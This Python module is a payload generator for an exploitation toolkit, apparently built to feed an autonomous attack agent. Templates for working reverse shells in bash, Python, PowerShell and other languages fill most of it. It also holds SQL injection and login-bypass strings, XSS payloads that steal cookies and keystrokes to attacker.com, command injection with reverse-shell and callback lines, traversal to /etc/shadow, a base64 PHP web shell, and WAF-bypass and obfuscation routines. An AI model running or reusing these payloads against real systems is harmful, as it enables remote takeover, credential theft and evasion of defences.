"""
Payload Crafter

Generates payloads for various exploitation scenarios:
- Reverse shells (bash, python, php, powershell, etc.)
- SQL injection payloads (union, blind, error-based)
- XSS payloads (reflected, DOM, stored)
- Command injection payloads
- File inclusion payloads

Supports:
- Multiple encoding schemes (base64, URL, hex, unicode)
- WAF bypass techniques
- Obfuscation methods
- Platform-specific variants

Integration Points:
- exploit_db.py: Uses crafted payloads in exploit templates
- tool_manager.py: Injects payloads into tool commands
- autonomous_agent.py: Generates payloads during exploitation phase
"""

import base64
import logging
import random
import re
import string
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Any

logger = logging.getLogger(__name__)


class PayloadType(Enum):
    """Types of payloads"""
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    WEB_SHELL = "web_shell"
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    FILE_INCLUSION = "file_inclusion"
    XXES = "xxe"
    SSTI = "ssti"


class EncodingType(Enum):
    """Encoding schemes"""
    NONE = "none"
    BASE64 = "base64"
    URL = "url"
    DOUBLE_URL = "double_url"
    HEX = "hex"
    UNICODE = "unicode"
    HTML_ENTITY = "html_entity"
    OCTAL = "octal"


class ShellType(Enum):
    """Shell types for reverse/bind shells"""
    BASH = "bash"
    SH = "sh"
    PYTHON = "python"
    PYTHON3 = "python3"
    PERL = "perl"
    PHP = "php"
    RUBY = "ruby"
    NC = "nc"
    NC_MKFIFO = "nc_mkfifo"
    POWERSHELL = "powershell"
    POWERSHELL_BASE64 = "powershell_base64"
    AWK = "awk"
    LUA = "lua"
    JAVA = "java"
    NODEJS = "nodejs"


class SQLDialect(Enum):
    """SQL database dialects"""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"


@dataclass
class CraftedPayload:
    """Result of payload crafting"""
    payload: str
    payload_type: PayloadType
    encoding: EncodingType
    raw_payload: str  # Before encoding
    description: str
    platform: str
    evasion_techniques: List[str] = field(default_factory=list)
    success_indicators: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)


class PayloadCrafter:
    """
    Crafts exploitation payloads with encoding and evasion support.
    
    Usage:
        crafter = PayloadCrafter()
        
        # Reverse shell
        payload = crafter.craft_reverse_shell(
            shell_type=ShellType.BASH,
            lhost="10.10.14.1",
            lport=4444,
            encoding=EncodingType.BASE64
        )
        
        # SQL injection
        payload = crafter.craft_sqli(
            dialect=SQLDialect.MYSQL,
            injection_type="union",
            columns=5,
            target_column=3,
            waf_bypass=True
        )
        
        # XSS
        payload = crafter.craft_xss(
            xss_type="reflected",
            action="cookie_steal",
            callback_url="http://attacker.com/steal"
        )
    """
    
    def __init__(self):
        """Initialize the payload crafter"""
        self._initialize_templates()
        logger.info("[PayloadCrafter] Initialized")
    
    def _initialize_templates(self):
        """Initialize payload templates"""
        
        # ==================== REVERSE SHELLS ====================
        self.reverse_shells = {
            ShellType.BASH: 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            
            ShellType.SH: '/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            
            ShellType.PYTHON: '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'''',
            
            ShellType.PYTHON3: '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'''',
            
            ShellType.PERL: '''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'''',
            
            ShellType.PHP: '''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'''',
            
            ShellType.RUBY: '''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'''',
            
            ShellType.NC: 'nc -e /bin/sh {lhost} {lport}',
            
            ShellType.NC_MKFIFO: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
            
            ShellType.POWERSHELL: '''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()''',
            
            ShellType.AWK: '''awk 'BEGIN {{s = "/inet/tcp/0/{lhost}/{lport}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null''',
            
            ShellType.LUA: '''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');"''',
            
            ShellType.NODEJS: '''(function(){{var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({lport},"{lhost}",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();''',
        }
        
        # ==================== SQL INJECTION PAYLOADS ====================
        self.sqli_payloads = {
            # Union-based
            "union_basic": "' UNION SELECT {columns}-- -",
            "union_null": "' UNION SELECT {nulls}-- -",
            "union_string": "' UNION ALL SELECT {columns}-- -",
            "union_from_dual": "' UNION SELECT {columns} FROM dual-- -",  # Oracle
            
            # Error-based
            "error_extractvalue": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT {query}),0x7e))-- -",
            "error_updatexml": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT {query}),0x7e),1)-- -",
            "error_floor": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT {query}),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            
            # Boolean-based blind
            "blind_boolean": "' AND (SELECT SUBSTRING({query},{pos},1))='{char}'-- -",
            "blind_if": "' AND IF({condition},1,0)-- -",
            "blind_case": "' AND CASE WHEN ({condition}) THEN 1 ELSE 0 END-- -",
            
            # Time-based blind
            "blind_sleep": "' AND SLEEP({delay})-- -",
            "blind_benchmark": "' AND BENCHMARK({iterations},SHA1('test'))-- -",
            "blind_pg_sleep": "'; SELECT pg_sleep({delay})-- -",  # PostgreSQL
            "blind_waitfor": "'; WAITFOR DELAY '0:0:{delay}'-- -",  # MSSQL
            
            # Stacked queries
            "stacked_basic": "'; {query}-- -",
            
            # Authentication bypass
            "auth_bypass_or": "' OR '1'='1'-- -",
            "auth_bypass_comment": "admin'-- -",
            "auth_bypass_or_true": "' OR 1=1-- -",
            
            # Data extraction
            "extract_version_mysql": "' UNION SELECT @@version-- -",
            "extract_version_pg": "' UNION SELECT version()-- -",
            "extract_version_mssql": "' UNION SELECT @@VERSION-- -",
            "extract_user_mysql": "' UNION SELECT user()-- -",
            "extract_database_mysql": "' UNION SELECT database()-- -",
            "extract_tables": "' UNION SELECT table_name FROM information_schema.tables-- -",
            "extract_columns": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'-- -",
        }
        
        # ==================== XSS PAYLOADS ====================
        self.xss_payloads = {
            # Basic
            "basic_script": "<script>alert('{marker}')</script>",
            "basic_img": "<img src=x onerror=alert('{marker}')>",
            "basic_svg": "<svg onload=alert('{marker}')>",
            "basic_body": "<body onload=alert('{marker}')>",
            "basic_input": "<input onfocus=alert('{marker}') autofocus>",
            "basic_marquee": "<marquee onstart=alert('{marker}')>",
            "basic_video": "<video><source onerror=alert('{marker}')>",
            "basic_details": "<details open ontoggle=alert('{marker}')>",
            
            # Event handlers
            "event_onclick": "<div onclick=alert('{marker}')>Click me</div>",
            "event_onmouseover": "<div onmouseover=alert('{marker}')>Hover me</div>",
            "event_onerror": "<img src=x onerror=alert('{marker}')>",
            "event_onload": "<body onload=alert('{marker}')>",
            
            # Cookie stealing
            "steal_cookie_img": "<img src=x onerror=\"new Image().src='{callback}?c='+document.cookie\">",
            "steal_cookie_fetch": "<script>fetch('{callback}?c='+document.cookie)</script>",
            "steal_cookie_xhr": "<script>var x=new XMLHttpRequest();x.open('GET','{callback}?c='+document.cookie);x.send();</script>",
            
            # Keylogger
            "keylogger": "<script>document.onkeypress=function(e){{new Image().src='{callback}?k='+e.key;}}</script>",
            
            # DOM-based
            "dom_location": "<script>eval(location.hash.slice(1))</script>",
            "dom_innerhtml": "<div id='x'></div><script>document.getElementById('x').innerHTML='<img src=x onerror=alert(\"{marker}\")>'</script>",
            
            # Polyglot (works in multiple contexts)
            "polyglot_basic": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert('{marker}') )//",
            "polyglot_advanced": "'\"-->]]>*/</script></style></title></textarea></noscript></template></select><img src=x onerror=alert('{marker}')>",
        }
        
        # ==================== COMMAND INJECTION PAYLOADS ====================
        self.cmdi_payloads = {
            # Basic
            "basic_semicolon": "; {command}",
            "basic_pipe": "| {command}",
            "basic_ampersand": "& {command}",
            "basic_double_ampersand": "&& {command}",
            "basic_double_pipe": "|| {command}",
            "basic_backtick": "`{command}`",
            "basic_subshell": "$({command})",
            "basic_newline": "\n{command}",
            
            # Blind
            "blind_sleep": "; sleep {delay}",
            "blind_ping": "; ping -c {count} {callback}",
            "blind_curl": "; curl {callback}",
            "blind_wget": "; wget {callback}",
            "blind_dns": "; nslookup {subdomain}.{callback}",
            
            # Reverse shell triggers
            "revshell_bash": "; bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "revshell_nc": "; nc -e /bin/sh {lhost} {lport}",
            
            # Filter bypass
            "bypass_space_ifs": ";{IFS}{command}",
            "bypass_space_tab": ";\t{command}",
            "bypass_space_brace": ";{command,}",
            "bypass_cat_tac": ";tac {file}",
            "bypass_cat_nl": ";nl {file}",
            "bypass_cat_xxd": ";xxd {file}",
        }
        
        # ==================== LFI/RFI PAYLOADS ====================
        self.lfi_payloads = {
            # Basic traversal
            "basic_passwd": "../../../etc/passwd",
            "basic_shadow": "../../../etc/shadow",
            "basic_hosts": "../../../etc/hosts",
            
            # Null byte (older PHP)
            "null_byte": "../../../etc/passwd%00",
            
            # Double encoding
            "double_encode": "..%252f..%252f..%252fetc/passwd",
            
            # UTF-8 encoding
            "utf8_encode": "..%c0%af..%c0%af..%c0%afetc/passwd",
            
            # Wrapper abuse (PHP)
            "php_filter_base64": "php://filter/convert.base64-encode/resource={file}",
            "php_filter_read": "php://filter/read=string.rot13/resource={file}",
            "php_input": "php://input",
            "php_data": "data://text/plain;base64,{payload}",
            "php_expect": "expect://{command}",
            
            # Log poisoning targets
            "log_apache_access": "../../../var/log/apache2/access.log",
            "log_apache_error": "../../../var/log/apache2/error.log",
            "log_nginx_access": "../../../var/log/nginx/access.log",
            "log_ssh": "../../../var/log/auth.log",
            "log_mail": "../../../var/log/mail.log",
            
            # Proc files
            "proc_self_environ": "/proc/self/environ",
            "proc_self_cmdline": "/proc/self/cmdline",
            "proc_self_fd": "/proc/self/fd/{fd}",
        }
        
        # ==================== WAF BYPASS TECHNIQUES ====================
        self.waf_bypasses = {
            "case_variation": lambda p: self._apply_case_variation(p),
            "comment_insertion": lambda p: p.replace(" ", "/**/"),
            "url_encoding": lambda p: urllib.parse.quote(p),
            "double_url_encoding": lambda p: urllib.parse.quote(urllib.parse.quote(p)),
            "unicode_encoding": lambda p: self._apply_unicode_encoding(p),
            "html_encoding": lambda p: self._apply_html_encoding(p),
            "null_byte_insertion": lambda p: p.replace(" ", "%00"),
            "newline_insertion": lambda p: p.replace(" ", "\n"),
            "tab_insertion": lambda p: p.replace(" ", "\t"),
        }
    
    # ==================== REVERSE SHELL METHODS ====================
    
    def craft_reverse_shell(
        self,
        shell_type: ShellType,
        lhost: str,
        lport: int,
        encoding: EncodingType = EncodingType.NONE,
        obfuscate: bool = False
    ) -> CraftedPayload:
        """
        Craft a reverse shell payload.
        
        Args:
            shell_type: Type of shell (bash, python, php, etc.)
            lhost: Attacker's IP address
            lport: Attacker's listening port
            encoding: Encoding to apply
            obfuscate: Whether to obfuscate the payload
            
        Returns:
            CraftedPayload object
        """
        template = self.reverse_shells.get(shell_type)
        if not template:
            raise ValueError(f"Unknown shell type: {shell_type}")
        
        # Build raw payload
        raw_payload = template.format(lhost=lhost, lport=lport)
        
        # Apply obfuscation if requested
        if obfuscate:
            raw_payload = self._obfuscate_shell(raw_payload, shell_type)
        
        # Apply encoding
        encoded_payload = self._encode_payload(raw_payload, encoding)
        
        # Wrap if needed
        if encoding == EncodingType.BASE64 and shell_type in [ShellType.BASH, ShellType.SH]:
            encoded_payload = f"echo {encoded_payload} | base64 -d | bash"
        elif encoding == EncodingType.BASE64 and shell_type == ShellType.POWERSHELL:
            encoded_payload = f"powershell -enc {encoded_payload}"
        
        return CraftedPayload(
            payload=encoded_payload,
            payload_type=PayloadType.REVERSE_SHELL,
            encoding=encoding,
            raw_payload=raw_payload,
            description=f"{shell_type.value} reverse shell to {lhost}:{lport}",
            platform="linux" if shell_type != ShellType.POWERSHELL else "windows",
            evasion_techniques=["obfuscation"] if obfuscate else [],
            success_indicators=["connect", "shell", "uid=", "whoami"],
            metadata={"lhost": lhost, "lport": lport, "shell_type": shell_type.value}
        )
    
    def get_all_reverse_shells(self, lhost: str, lport: int) -> List[CraftedPayload]:
        """Get all reverse shell variants for trying multiple"""
        shells = []
        for shell_type in ShellType:
            try:
                payload = self.craft_reverse_shell(shell_type, lhost, lport)
                shells.append(payload)
            except Exception:
                pass
        return shells
    
    # ==================== SQL INJECTION METHODS ====================
    
    def craft_sqli(
        self,
        injection_type: str,
        dialect: SQLDialect = SQLDialect.MYSQL,
        columns: int = 5,
        target_column: int = 3,
        query: str = None,
        table: str = None,
        waf_bypass: bool = False,
        encoding: EncodingType = EncodingType.NONE
    ) -> CraftedPayload:
        """
        Craft a SQL injection payload.
        
        Args:
            injection_type: Type of injection (union_basic, error_extractvalue, etc.)
            dialect: SQL dialect
            columns: Number of columns for UNION
            target_column: Which column to inject into
            query: Query to execute (for error-based and blind)
            table: Target table name
            waf_bypass: Apply WAF bypass techniques
            encoding: Encoding to apply
            
        Returns:
            CraftedPayload object
        """
        template = self.sqli_payloads.get(injection_type)
        if not template:
            raise ValueError(f"Unknown injection type: {injection_type}")
        
        # Build column list for UNION
        if "union" in injection_type:
            if target_column > columns:
                target_column = columns
            
            col_list = ["NULL"] * columns
            if query:
                col_list[target_column - 1] = f"({query})"
            else:
                col_list[target_column - 1] = "@@version"
            
            columns_str = ",".join(col_list)
            nulls_str = ",".join(["NULL"] * columns)
            
            raw_payload = template.format(
                columns=columns_str,
                nulls=nulls_str,
                query=query or "@@version"
            )
        else:
            raw_payload = template.format(
                query=query or "@@version",
                table=table or "users",
                pos=1,
                char="a",
                condition="1=1",
                delay=5,
                iterations=10000000
            )
        
        # Apply WAF bypass
        evasion = []
        if waf_bypass:
            raw_payload = self._apply_sqli_waf_bypass(raw_payload, dialect)
            evasion.append("waf_bypass")
        
        # Apply encoding
        encoded_payload = self._encode_payload(raw_payload, encoding)
        
        return CraftedPayload(
            payload=encoded_payload,
            payload_type=PayloadType.SQL_INJECTION,
            encoding=encoding,
            raw_payload=raw_payload,
            description=f"{injection_type} SQL injection for {dialect.value}",
            platform=dialect.value,
            evasion_techniques=evasion,
            success_indicators=["database", "table", "column", "version", "error in your SQL"],
            metadata={"dialect": dialect.value, "injection_type": injection_type}
        )
    
    def craft_sqli_auth_bypass(
        self,
        dialect: SQLDialect = SQLDialect.MYSQL,
        waf_bypass: bool = False
    ) -> List[CraftedPayload]:
        """Get list of authentication bypass payloads"""
        bypass_payloads = [
            "' OR '1'='1'-- -",
            "' OR '1'='1'/*",
            "' OR 1=1-- -",
            "admin'-- -",
            "admin'#",
            "') OR ('1'='1'-- -",
            "' OR ''='",
            "1' OR '1'='1",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR 1=1-- -",
            "admin')-- -",
        ]
        
        results = []
        for payload in bypass_payloads:
            if waf_bypass:
                payload = self._apply_sqli_waf_bypass(payload, dialect)
            
            results.append(CraftedPayload(
                payload=payload,
                payload_type=PayloadType.SQL_INJECTION,
                encoding=EncodingType.NONE,
                raw_payload=payload,
                description="SQL authentication bypass",
                platform=dialect.value,
                evasion_techniques=["waf_bypass"] if waf_bypass else [],
                success_indicators=["welcome", "dashboard", "logged in", "success"],
                metadata={"dialect": dialect.value, "injection_type": "auth_bypass"}
            ))
        
        return results
    
    # ==================== XSS METHODS ====================
    
    def craft_xss(
        self,
        xss_type: str,
        marker: str = "XSS",
        callback: str = None,
        encoding: EncodingType = EncodingType.NONE,
        waf_bypass: bool = False
    ) -> CraftedPayload:
        """
        Craft an XSS payload.
        
        Args:
            xss_type: Type of XSS payload (basic_script, steal_cookie_img, etc.)
            marker: Marker string for alert/confirmation
            callback: Callback URL for cookie stealing
            encoding: Encoding to apply
            waf_bypass: Apply WAF bypass techniques
            
        Returns:
            CraftedPayload object
        """
        template = self.xss_payloads.get(xss_type)
        if not template:
            raise ValueError(f"Unknown XSS type: {xss_type}")
        
        raw_payload = template.format(
            marker=marker,
            callback=callback or "http://attacker.com/steal"
        )
        
        evasion = []
        if waf_bypass:
            raw_payload = self._apply_xss_waf_bypass(raw_payload)
            evasion.append("waf_bypass")
        
        encoded_payload = self._encode_payload(raw_payload, encoding)
        
        return CraftedPayload(
            payload=encoded_payload,
            payload_type=PayloadType.XSS,
            encoding=encoding,
            raw_payload=raw_payload,
            description=f"XSS payload: {xss_type}",
            platform="browser",
            evasion_techniques=evasion,
            success_indicators=[marker, "alert", "XSS"],
            metadata={"xss_type": xss_type, "marker": marker}
        )
    
    def get_xss_polyglots(self) -> List[CraftedPayload]:
        """Get XSS polyglot payloads that work in multiple contexts"""
        polyglots = [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            "'\"-->]]>*/</script></style></title></textarea></noscript></template><img src=x onerror=alert()>",
            "'-alert()-'",
            "'-alert(1)-'",
            "'onclick=alert()//",
            "\"onclick=alert()//",
            "></script><script>alert()</script>",
            "{{constructor.constructor('alert()')()}}",
            "[[${7*7}]]",
        ]
        
        return [
            CraftedPayload(
                payload=p,
                payload_type=PayloadType.XSS,
                encoding=EncodingType.NONE,
                raw_payload=p,
                description="XSS polyglot payload",
                platform="browser",
                evasion_techniques=["polyglot"],
                success_indicators=["alert"],
                metadata={"xss_type": "polyglot"}
            )
            for p in polyglots
        ]
    
    # ==================== COMMAND INJECTION METHODS ====================
    
    def craft_cmdi(
        self,
        cmdi_type: str,
        command: str = "id",
        lhost: str = None,
        lport: int = None,
        callback: str = None,
        delay: int = 5,
        encoding: EncodingType = EncodingType.NONE,
        waf_bypass: bool = False
    ) -> CraftedPayload:
        """
        Craft a command injection payload.
        
        Args:
            cmdi_type: Type of injection (basic_semicolon, blind_sleep, etc.)
            command: Command to execute
            lhost: Attacker IP for reverse shells
            lport: Attacker port for reverse shells
            callback: Callback URL for blind
            delay: Delay in seconds for blind
            encoding: Encoding to apply
            waf_bypass: Apply bypass techniques
            
        Returns:
            CraftedPayload object
        """
        template = self.cmdi_payloads.get(cmdi_type)
        if not template:
            raise ValueError(f"Unknown command injection type: {cmdi_type}")
        
        raw_payload = template.format(
            command=command,
            lhost=lhost or "127.0.0.1",
            lport=lport or 4444,
            callback=callback or "http://attacker.com",
            delay=delay,
            count=4,
            subdomain=self._generate_random_string(8),
            file="/etc/passwd",
            IFS="${IFS}"
        )
        
        evasion = []
        if waf_bypass:
            raw_payload = self._apply_cmdi_waf_bypass(raw_payload)
            evasion.append("waf_bypass")
        
        encoded_payload = self._encode_payload(raw_payload, encoding)
        
        return CraftedPayload(
            payload=encoded_payload,
            payload_type=PayloadType.COMMAND_INJECTION,
            encoding=encoding,
            raw_payload=raw_payload,
            description=f"Command injection: {cmdi_type}",
            platform="linux",
            evasion_techniques=evasion,
            success_indicators=["uid=", "root", command],
            metadata={"cmdi_type": cmdi_type, "command": command}
        )
    
    # ==================== LFI METHODS ====================
    
    def craft_lfi(
        self,
        lfi_type: str,
        file: str = "/etc/passwd",
        payload: str = None,
        command: str = None,
        fd: int = 0,
        encoding: EncodingType = EncodingType.NONE,
        traversal_depth: int = 6
    ) -> CraftedPayload:
        """
        Craft a local file inclusion payload.
        
        Args:
            lfi_type: Type of LFI (basic_passwd, php_filter_base64, etc.)
            file: Target file to read
            payload: Base64 payload for php_data wrapper
            command: Command for php_expect wrapper
            fd: File descriptor for /proc/self/fd
            encoding: Encoding to apply
            traversal_depth: Number of ../ to add
            
        Returns:
            CraftedPayload object
        """
        template = self.lfi_payloads.get(lfi_type)
        if not template:
            raise ValueError(f"Unknown LFI type: {lfi_type}")
        
        # Handle traversal
        if lfi_type.startswith("basic_") or lfi_type.startswith("log_"):
            traversal = "../" * traversal_depth
            template = traversal + template.lstrip("../")
        
        raw_payload = template.format(
            file=file,
            payload=payload or base64.b64encode(b"<?php system($_GET['cmd']); ?>").decode(),
            command=command or "id",
            fd=fd
        )
        
        encoded_payload = self._encode_payload(raw_payload, encoding)
        
        return CraftedPayload(
            payload=encoded_payload,
            payload_type=PayloadType.FILE_INCLUSION,
            encoding=encoding,
            raw_payload=raw_payload,
            description=f"LFI payload: {lfi_type}",
            platform="linux",
            evasion_techniques=[],
            success_indicators=["root:", "www-data", "bin/bash", "<?php"],
            metadata={"lfi_type": lfi_type, "file": file}
        )
    
    # ==================== ENCODING METHODS ====================
    
    def _encode_payload(self, payload: str, encoding: EncodingType) -> str:
        """Apply encoding to payload"""
        if encoding == EncodingType.NONE:
            return payload
        elif encoding == EncodingType.BASE64:
            return base64.b64encode(payload.encode()).decode()
        elif encoding == EncodingType.URL:
            return urllib.parse.quote(payload)
        elif encoding == EncodingType.DOUBLE_URL:
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == EncodingType.HEX:
            return payload.encode().hex()
        elif encoding == EncodingType.UNICODE:
            return self._apply_unicode_encoding(payload)
        elif encoding == EncodingType.HTML_ENTITY:
            return self._apply_html_encoding(payload)
        else:
            return payload
    
    def _apply_unicode_encoding(self, payload: str) -> str:
        """Apply unicode encoding"""
        result = ""
        for char in payload:
            if char.isalpha():
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result
    
    def _apply_html_encoding(self, payload: str) -> str:
        """Apply HTML entity encoding"""
        result = ""
        for char in payload:
            result += f"&#{ord(char)};"
        return result
    
    def _apply_case_variation(self, payload: str) -> str:
        """Apply random case variation"""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )
    
    # ==================== WAF BYPASS METHODS ====================
    
    def _apply_sqli_waf_bypass(self, payload: str, dialect: SQLDialect) -> str:
        """Apply SQL injection WAF bypass techniques"""
        bypasses = [
            (r'\s+', '/**/'),  # Replace spaces with comments
            (r'SELECT', 'SeLeCt'),  # Case variation
            (r'UNION', 'UnIoN'),
            (r'FROM', 'FrOm'),
            (r'WHERE', 'WhErE'),
            (r"'", '%27'),  # URL encode quotes
            (r'"', '%22'),
        ]
        
        result = payload
        for pattern, replacement in bypasses:
            result = re.sub(pattern, replacement, result, flags=re.IGNORECASE)
        
        return result
    
    def _apply_xss_waf_bypass(self, payload: str) -> str:
        """Apply XSS WAF bypass techniques"""
        bypasses = [
            ('script', 'scr\x00ipt'),  # Null byte
            ('alert', 'al\\u0065rt'),  # Unicode
            ('onerror', 'oNeRrOr'),  # Case variation
            ('<', '\\x3c'),  # Hex encoding
            ('>', '\\x3e'),
        ]
        
        result = payload
        for pattern, replacement in bypasses:
            result = result.replace(pattern, replacement)
        
        return result
    
    def _apply_cmdi_waf_bypass(self, payload: str) -> str:
        """Apply command injection WAF bypass techniques"""
        bypasses = [
            (' ', '${IFS}'),  # Replace space with $IFS
            ('cat', 'c""at'),  # Quote insertion
            ('ls', 'l""s'),
            ('id', 'i""d'),
        ]
        
        result = payload
        for pattern, replacement in bypasses:
            result = result.replace(pattern, replacement)
        
        return result
    
    # ==================== OBFUSCATION METHODS ====================
    
    def _obfuscate_shell(self, payload: str, shell_type: ShellType) -> str:
        """Obfuscate shell payload"""
        if shell_type in [ShellType.BASH, ShellType.SH]:
            # Base64 encode and decode on execution
            encoded = base64.b64encode(payload.encode()).decode()
            return f"echo {encoded} | base64 -d | bash"
        elif shell_type == ShellType.POWERSHELL:
            # PowerShell base64 encoding
            encoded = base64.b64encode(payload.encode('utf-16le')).decode()
            return f"powershell -enc {encoded}"
        elif shell_type in [ShellType.PYTHON, ShellType.PYTHON3]:
            # Python exec with encoded string
            encoded = base64.b64encode(payload.encode()).decode()
            return f"python3 -c \"import base64;exec(base64.b64decode('{encoded}'))\""
        
        return payload
    
    def _generate_random_string(self, length: int = 8) -> str:
        """Generate random string for markers"""
        return ''.join(random.choices(string.ascii_lowercase, k=length))


# Singleton instance
_payload_crafter: Optional[PayloadCrafter] = None


def get_payload_crafter() -> PayloadCrafter:
    """Get singleton PayloadCrafter instance"""
    global _payload_crafter
    if _payload_crafter is None:
        _payload_crafter = PayloadCrafter()
    return _payload_crafter
